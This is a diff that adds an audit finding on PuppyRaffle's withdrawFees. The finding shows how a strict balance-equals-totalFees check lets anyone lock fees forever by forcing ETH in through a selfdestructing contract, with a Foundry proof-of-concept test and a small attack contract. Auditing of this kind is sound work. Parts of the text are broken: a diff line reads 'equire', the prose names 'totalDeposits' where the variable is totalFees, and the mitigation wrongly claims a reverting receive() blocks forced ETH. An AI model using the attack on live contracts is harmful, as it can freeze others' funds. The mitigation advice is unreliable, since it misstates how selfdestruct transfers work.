@@ -296,4 +296,93 @@ Place the following test into `PuppleRaffleTest.t.sol`
 - Use newer versions of solidity, >0.8.0
 - Use a bigger uint type
 
+### [S-#] Mishandling of ETH During Fee Withdrawal (Logic Flaw + Denial of Service)
+
+**Description:** The `PuppleRaffle::withdrawFees` function includes a fragile balance check that directly compares the contract’s ETH balance with the recorded `totalFees` value:
+```javascript
+require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+```
+This introduces a mishandling of ETH risk because the contract assumes its balance will always equal the tracked `totalFees`.
+However, this assumption can easily be broken if the contract receives Ether outside normal flows, for example, through a self-destruct from another contract or direct transfers without calling enterRaffle().
+Once the balance mismatch occurs, legitimate withdrawals will revert, permanently locking all funds in the contract.
+
+**Impact:** 
+- Permanent loss of access to legitimate fees due to reverted withdrawals.
+- Attackers or users can grief the protocol by forcing extra ETH into the contract, causing a Denial of Service (DoS) on fee withdrawal.
+- The mismatch also breaks accounting integrity, as totalFees no longer accurately reflects the real contract balance.
+
+**Proof of Concept:**
+
+<details>
+<summary>PoC</summary>
+Place the following test into `PuppleRaffleTest.t.sol`
+
+```javascript
+    function testMishandlingFeesInWithrawFees() public playersEntered {
+        // finish the raffle to allow fees withdrawal
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+        uint256 contractBalanceBefore = address(puppyRaffle).balance;
+        uint256 totalFeesBefore = puppyRaffle.totalFees();
+        console.log("contract balance before:", contractBalanceBefore);
+        console.log("total fees before:", totalFeesBefore);
+        assertEq(contractBalanceBefore, totalFeesBefore);
+
+        Destruct attacker = new Destruct();
+        attacker.attack{value: 1 ether}(address(puppyRaffle));
+        assertGt(address(puppyRaffle).balance, puppyRaffle.totalFees(), "Destruct cause mismatch in balances");
+
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+```
+
+A malicious contract can intentionally send extra ETH to PuppyRaffle without participating in the raffle:
+
+```javascript
+contract Destruct {
+    function attack(address target) external payable {
+        selfdestruct(payable(target));
+    }
+}
+
+```
+
+After deploying Destruct, the attacker calls:
+
+```javascript
+attacker.attack{value: 1 ether}(address(puppyRaffle));
+```
+This increases address(puppyRaffle).balance without updating totalFees.
+Subsequent calls to withdrawFees() will revert with
+"PuppyRaffle: There are currently players active!",
+effectively locking all legitimate funds in the contract.
+</details>
+
+**Recommended Mitigation:** 
+- Avoid strict equality checks between address(this).balance and internal accounting variables. The code could be changed to >= instead of ==. Which means that the available ETH balance should be _at least_ `totalDeposits`, which makes more sense.
+```diff
++ equire(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
+```
+- Remove or loosen the condition to allow withdrawals as long as there are no active players, rather than matching balances.
+
+```diff
+- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+```
+
+```diff
++ require(players.length == 0, "PuppyRaffle: There are currently players active!");
+```
+- implement a receive() function that rejects unsolicited ETH to maintain accounting integrity:
+```diff
++ receive() external payable {
++    revert("Direct ETH transfers not allowed");
+}
+
+```
+
+
+
 
